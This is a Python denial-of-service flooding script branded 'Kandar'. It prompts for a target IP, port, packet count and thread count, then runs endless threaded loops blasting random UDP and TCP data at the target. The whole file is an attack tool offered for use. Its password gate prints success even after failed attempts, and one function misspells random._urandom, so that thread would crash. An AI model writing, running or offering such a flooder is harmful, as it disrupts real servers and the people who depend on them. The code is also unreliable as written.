import random
import socket
import threading
import os,sys
import time
password ='k4ndar147'

os.system("clear")
for i in range(3):
    pwd = input("[=>] Enter Account : ")
    j=3
    if(pwd==password):
        time.sleep(4)
        print("[+] Wait A Moment!!! ")
        break
    else:
        time.sleep(5)
        print("[=>] Wrong Account!!! ")
        continue
time.sleep(5)
print("[@] Login Successful")
time.sleep(5)

os.system("clear")
print("""
     Tools By : Kandar
██╗░░██╗░█████╗░███╗░░██╗██████╗░░█████╗░██████╗░
██║░██╔╝██╔══██╗████╗░██║██╔══██╗██╔══██╗██╔══██╗
█████═╝░███████║██╔██╗██║██║░░██║███████║██████╔╝
██╔═██╗░██╔══██║██║╚████║██║░░██║██╔══██║██╔══██╗
██║░╚██╗██║░░██║██║░╚███║██████╔╝██║░░██║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝""")

ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
choice = str(input(" Gas Bwanv(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urando(1800)
	i = random.choice(("[=>]","[=>]","[=>]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ATTACK IP SERVER!!!")
		except:
			print("[X] AMPUN BANG!!!")

def run2():
	data = random._urandom(180)
	i = random.choice(("[=>]","[=>]","[=>]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ATTACK IP SERVER!!!")
		except:
			s.close()
			print("[X] AMPUN BANG")

def run3():
	data = random._urandom(16)
	i = random.choice(("[=>]","[=>]","[=>]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ATTACK IP SERVER!!!")
		except:
			s.close()
			print("[X] AMPUN BANG")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
